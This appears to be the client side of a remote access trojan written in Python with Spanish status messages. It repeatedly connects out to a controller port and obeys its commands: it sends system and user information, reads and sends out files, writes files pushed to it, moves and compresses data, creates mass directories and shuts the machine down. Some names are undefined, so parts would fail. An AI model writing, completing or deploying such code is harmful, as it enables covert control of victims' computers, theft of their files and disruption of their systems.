import socket
import subprocess
import platform
import os
import getpass
import time
import zipfile
from shutil import move
 
var = False
espera = 1
while var == False:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = '0.0.0.0'
        client.connect((host, 52324))
        print()
        var = True
    except:
        print("IP no encontrada")
        time.sleep(60)
 
 
client.send(bytes(f"{platform.system()}", "utf-8"))
while True:
 
    sysInfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
    msg = client.recv(100)
    msg.decode("utf-8")
    print(msg)
 
    if(msg == b'Info'):
        client.send(bytes(sysInfo, "utf-8"))
 
    if(msg == b'Dir'):
        client.send(bytes(str(os.listdir(".")), "utf-8"))
 
    if(msg == b'Cd'):
        direc = client.recv(100)
        direc.decode("utf-8")
        os.chdir(direc)
 
    if(msg == b'Pwd'):
        ruta = f'{os.getcwd()}'
        print(ruta)
        client.send(bytes(ruta, "utf-8"))
 
    if(msg == b'Shutdown'):
        os.system('shutdown -s -t 1')
 
    if (msg == b'Close'):
        break
 
    if(msg == b'Col'):
        numC = client.recv(1024)
        colPath = client.recv(1024)
        for i in range(0, int(numC)):
            rutaColapsada = colPath.decode("utf-8") + "\\" + str(i)
            if os.path.exists(rutaColapsada):
                rutaColapsada = rutaColapsada + str(arregloParaRutas)
                os.mkdir(rutaColapsada)
            else:
                os.mkdir(rutaColapsada)
        client.send(bytes("Proceso terminado", "utf-8"))
 
    if(msg == b'Touch'):
        try:
            titulo = client.recv(1024)
            print(titulo)
            filePath = client.recv(1024)
            print(filePath)
            contenido = client.recv(100024)
            print(contenido)
            file = open(filePath.decode("utf-8") + "\\" + titulo.decode("utf-8"), "w")
            print("Creado")
            file.write(contenido.decode("utf-8"))
            file.close()
            cliente.send(bytes("Creado correctamente", "utf-8"))
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
    if(msg == b'Download'):
        try:
            fileName = client.recv(100)
            f = open(fileName, 'wb')
            print(fileName)
            fileData = client.recv(99999999)
            print(fileData)
            time.sleep(2)
            f.write(fileData)
            f.close()
            client.send(bytes("Creado correctamente", "utf-8"))
 
        except:
            client.send(bytes("Ha ocurrido un error, probablemente no tengas los permisos suficientes", "utf-8"))
 
    if(msg == b'Read'):
        pathFile = client.recv(1024)
        pathFile.decode("utf-8")
        f = open(pathFile, 'rb')
        fileData = f.read(99999)
        client.send(fileData)
 
    if(msg == b'Uncompress'):
        try:
            uncompressPath = client.recv(1024)
            uncompressDestiny = client.recv(1024)
            patoolib.extract_archive(uncompressPath.decode("utf-8"), outdir=uncompressDestiny.decode("utf-8"))
            client.send(bytes("Descomprimido correctamente", "utf-8"))
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
 
    if(msg == b'Usr'):
        client.send(bytes(getpass.getuser(), "utf-8"))
 
    if(msg == b'Compress'):
        try:
            name = client.recv(1024)
            namePath = client.recv(1024)
 
            jungle_zip = zipfile.ZipFile(name.decode("utf-8"), 'w')
            jungle_zip.write(namePath.decode("utf-8"), compress_type=zipfile.ZIP_DEFLATED)
 
            jungle_zip.close()
            client.send(bytes("Comprimido correctamente", "utf-8"))
 
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
    if(msg == b'Mkdir'):
        try:
            path = client.recv(1024)
            os.mkdir(path.decode("utf-8"))
            client.send(bytes("Creada correctamente", "utf-8"))
            print("enviado")
        except:
            client.send(bytes("A ocurrido un error", "utf-8"))
 
    if(msg == b'Move'):
        try:
            movePath = client.recv(1024)
            moveDestiny = client.recv(1024)
            move(movePath.decode("utf-8"), moveDestiny.decode("utf-8"))
            client.send(bytes("Transportado correctamente", "utf-8"))
        except:
            client.send(bytes("Ha ocurrido un error", "utf-8"))
 
    time.sleep(espera)